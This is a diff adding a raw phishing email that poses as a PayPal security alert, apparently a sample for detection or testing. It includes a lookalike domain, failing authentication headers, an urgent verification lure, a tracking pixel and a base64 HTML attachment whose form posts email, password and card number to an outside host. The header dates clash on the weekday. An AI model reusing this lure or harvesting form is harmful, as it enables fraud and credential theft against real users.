@@ -1,0 +1,141 @@
+From: "PayPal Security" <security@paypa1-secure-verification.info>
+To: victim@example.com
+Reply-To: "PayPal Support" <support@paypal-billing-alerts.com>
+Return-Path: <bounce@mailer3.paypa1-secure-verification.info>
+Subject: Security Alert: Unusual Activity Detected on Your Account
+Date: Mon, 27 Jul 2026 09:15:22 +0000
+Message-ID:
+ <a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d@paypa1-secure-verification.info>
+Received: from mx.example-corp.com by mailgw.example-corp.com with ESMTPS id
+ 7f3a9c2b1d; Wed, 27 Jul 2026 09:15:41 +0000
+Received: from mail.paypa1-secure-verification.info (unknown [203.0.113.77])
+ by mx.example-corp.com with ESMTP id 4d8e1a9f22; Wed, 27 Jul 2026 09:15:22
+ +0000
+Received-SPF: fail (example-corp.com: domain of
+ paypa1-secure-verification.info does not designate 203.0.113.77 as permitted
+ sender) client-ip=203.0.113.77;
+Authentication-Results: mx.example-corp.com; spf=fail
+ smtp.mailfrom=paypa1-secure-verification.info; dkim=fail
+ header.d=paypa1-secure-verification.info; dmarc=fail (p=reject sp=reject
+ dis=none) header.from=paypa1-secure-verification.info
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=paypa1-secure-verification.info; s=selector1; t=1785312922;
+ h=from:to:subject:date:message-id; bh=2jmj7l5rSw0yVb/vlWAYkK/YBwk=;
+ b=Kx9fL2mQpR7vW4nJ8sT1uY6zA3bC5dE0fG2hI9jK4lM7nO1pQ3rS5tU8vW==
+X-Mailer: PHPMailer 6.1.0
+X-Originating-IP: [203.0.113.77]
+X-Spam-Status: No, score=3.2 required=5.0
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============7885229958228914348=="
+
+--===============7885229958228914348==
+Content-Type: multipart/alternative;
+ boundary="===============0585887981689032733=="
+
+--===============0585887981689032733==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Dear Customer,
+
+We have detected unusual activity on your PayPal account from an unrecognized=
+ device. For your protection, you must verify your account immediately.
+
+If you do not verify your account within 24 hours, your account will be limit=
+ed and pending transactions will be cancelled.
+
+Verify your account now:
+http://203.0.113.77/secure/login.php?session=3D8f2ac1e9
+
+Thank you for your prompt attention to this matter.
+
+PayPal Security Team
+
+--===============0585887981689032733==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html>
+<head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8=
+"></head>
+<body style=3D"margin:0;padding:0;background:#f2f2f2;font-family:Helvetica,Ar=
+ial,sans-serif;">
+<table width=3D"100%" cellpadding=3D"0" cellspacing=3D"0" style=3D"background=
+:#f2f2f2;padding:24px 0;">
+<tr><td align=3D"center">
+<table width=3D"600" cellpadding=3D"0" cellspacing=3D"0" style=3D"background:=
+#ffffff;border-radius:6px;overflow:hidden;">
+<tr><td style=3D"background:#003087;padding:18px 24px;">
+<span style=3D"color:#ffffff;font-size:20px;font-weight:bold;">PayPal</span>
+</td></tr>
+<tr><td style=3D"padding:28px 32px;">
+<h2 style=3D"color:#1a1a1a;font-size:18px;margin:0 0 12px;">Unusual activity =
+on your account</h2>
+<p style=3D"color:#333333;font-size:14px;line-height:1.5;">Dear Customer,</p>
+<p style=3D"color:#333333;font-size:14px;line-height:1.5;">
+We have detected <b>unusual activity</b> on your PayPal account from an
+unrecognized device. For your protection, you must verify your account
+immediately.
+</p>
+<p style=3D"color:#333333;font-size:14px;line-height:1.5;">
+If you do not verify your account within 24 hours, your account will be
+limited and pending transactions will be cancelled.
+</p>
+<table cellpadding=3D"0" cellspacing=3D"0" style=3D"margin:24px 0;">
+<tr><td style=3D"background:#0070ba;border-radius:4px;">
+<a href=3D"http://203.0.113.77/secure/login.php?session=3D8f2ac1e9"
+   style=3D"display:inline-block;padding:12px 28px;color:#ffffff;text-decorat=
+ion:none;font-size:14px;font-weight:bold;">
+Verify Your Account
+</a>
+</td></tr>
+</table>
+<p style=3D"color:#888888;font-size:12px;line-height:1.5;">
+Or copy this link into your browser:<br>
+<a href=3D"https://paypa1-secure-verification.info/account/verify?ref=3D8827"=
+>https://paypa1-secure-verification.info/account/verify</a>
+</p>
+<p style=3D"color:#888888;font-size:12px;">A copy of your account statement i=
+s attached for your records.</p>
+</td></tr>
+<tr><td style=3D"background:#f7f7f7;padding:16px 32px;">
+<p style=3D"color:#999999;font-size:11px;margin:0;">
+&copy; 2026 PayPal Inc. This is an automated message, please do not reply.
+</p>
+</td></tr>
+</table>
+<img src=3D"https://paypa1-secure-verification.info/track/open.gif?uid=3D8827=
+" width=3D"1" height=3D"1" alt=3D"">
+</td></tr>
+</table>
+</body>
+</html>
+
+--===============0585887981689032733==--
+
+--===============7885229958228914348==
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Account_Verification_Form.html"
+MIME-Version: 1.0
+
+PGh0bWw+PGJvZHk+CjxoMj5QYXlQYWwgLSBDb25maXJtIFlvdXIgSWRlbnRpdHk8L2gyPgo8Zm9y
+bSBhY3Rpb249Imh0dHA6Ly8yMDMuMC4xMTMuNzcvc2VjdXJlL2NvbGxlY3QucGhwIiBtZXRob2Q9
+InBvc3QiPgpFbWFpbDogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImVtYWlsIj48YnI+ClBhc3N3
+b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIj48YnI+CkNhcmQgTnVt
+YmVyOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY2FyZCI+PGJyPgo8aW5wdXQgdHlwZT0ic3Vi
+bWl0IiB2YWx1ZT0iQ29uZmlybSI+CjwvZm9ybT4KPC9ib2R5PjwvaHRtbD4K
+
+--===============7885229958228914348==
+Content-Type: application/pdf
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Payment_Receipt.pdf"
+MIME-Version: 1.0
+
+JVBERi0xLjQKMSAwIG9iajw8L1R5cGUvQ2F0YWxvZy9QYWdlcyAyIDAgUj4+ZW5kb2JqCjIgMCBv
+Ymo8PC9UeXBlL1BhZ2VzL0tpZHNbMyAwIFJdL0NvdW50IDE+PmVuZG9iagozIDAgb2JqPDwvVHlw
+ZS9QYWdlL1BhcmVudCAyIDAgUi9NZWRpYUJveFswIDAgMjAwIDEwMF0+PmVuZG9iagp0cmFpbGVy
+PDwvUm9vdCAxIDAgUj4+CiUlRU9G
+
+--===============7885229958228914348==--
